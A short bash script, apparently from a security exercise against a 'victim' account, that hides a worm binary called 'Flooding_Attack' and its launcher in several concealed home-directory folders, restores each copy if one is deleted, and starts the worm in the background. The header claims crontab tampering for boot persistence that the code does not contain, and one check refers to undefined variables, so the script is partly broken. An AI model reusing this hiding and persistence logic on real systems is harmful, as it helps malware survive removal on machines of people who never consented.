#!/bin/bash

# This script is to:
# (1) Put the worm binary at the two locations:
#      * /home/victim/.etc/.module/Flooding_Attack
#      * /home/victim/.firefox/.module/Flooding_Attack
# (2) Put the worm launcher program at 
#      * /home/victim/.Launch_Attack/Launching_Attack
#      * /home/victim/.you_cant_see_me/Launching_Attack
# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
# 
# Noted that this script does not do any payload.

ldir1="/home/victim/.Launch_Attack"
ldir2="/home/victim/.you_cant_see_me"
lfname="launcher.sh"
wdir1="/home/victim/.etc/.module"
wdir2="/home/victim/.firefox/.module"
wfname="Flooding_Attack"

require_worm_distributed() {
    if [ ! -f "$wdir1/$wfname" -a -f "$wdir2/$wfname" ]; then
        mkdir -p $wdir1
        cp "$wdir2/$wfname" "$wdir1/$wfname"
    fi
    if [ ! -f "$dir2/$wormbin" -a -f "$wdir1/$wfname" ]; then
        mkdir -p $wdir2
        cp "$wdir1/$wfname" "$wdir2/$wfname"
    fi
}

require_launcher_distributed(){
    if [ ! -f "$ldir1/$lfname" -a -f "$ldir2/$lfname" ]; then
        mkdir -p "$ldir1"
        cp -f "$ldir2/$lfname" "$ldir1/$lfname"
    fi
    if [ ! -f "$ldir2/$lfname" -a -f "$ldir1/$lfname" ]; then
        mkdir -p "$ldir2"
        cp -f "$ldir1/$lfname" "$ldir2/$lfname"
    fi
}

require_worm_running(){
    ps -e | grep -q "$wfname"
    if [ $? -ne 0 ]; then
	# The final & makes this command run in background
        chmod +x $wdir1/$wfname && $wdir1/$wfname &> /dev/null &
    fi
}

require_launcher_distributed
require_worm_distributed
require_worm_running
